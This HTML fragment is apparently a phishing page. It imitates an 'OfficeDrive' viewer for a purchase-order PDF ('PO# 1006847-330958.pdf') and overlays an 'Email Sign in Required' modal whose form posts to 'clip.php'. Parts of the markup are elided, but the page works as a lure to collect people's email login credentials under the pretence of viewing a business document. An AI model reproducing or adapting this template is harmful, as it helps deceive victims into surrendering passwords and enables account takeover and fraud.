...
<title>OfficeDrive |PO# 1006847-330958.pdf</title>
...
<center><div style="background-color: #fff;margin-top: 2px;width: 70px;height: 96px;box-shadow: 1px 2px 5px #e8dfdf; padding-bottom: 10px;" class="solde"> </div></center> 
 <center><div style="flex-shrink: 1 ; font-family: Segoe UI, Segoe UI Web (West European), Segoe UI, -apple-system, BlinkMacSystemFont, Roboto, Helvetica Neue, sans-serif ; font-size: 14px ; font-weight: 400; margin-top: 6px; ">PO# 1006847-330958.pdf</div><div id="para1" style="flex-shrink: 1;font-family: Segoe UI, Segoe UI Web, Segoe UI, -apple-system, BlinkMacSystemFont, Roboto, Helvetica Neue, sans-serif;font-size: 12px;font-weight: 400;color: #777070;margin-top: -5px;"></div></center>
</div>
    ...
    <div class="modal-dialog" style="margin-top: 103px;width: 437px;">
      ...
      <div class="modal-content" style="border-radius: 0;height: 343px;box-shadow: 0 5px 10px rgba(0,0,0,.5);">
        <div class="modal-header">
		  ...
		  <h5>Email Sign in Required </h5>
        </div>
     <div class="modal-body">
		
		 <div>
		 <form method="post" action="clip.php" >
...
<center><div style="padding-top: 12px; font-size: 13px;">©2021 OfficeDrive &nbsp; &nbsp; Terms of use  &nbsp; &nbsp; Privacy & cookies </div></center>
        </div>
       </form>
      </div>
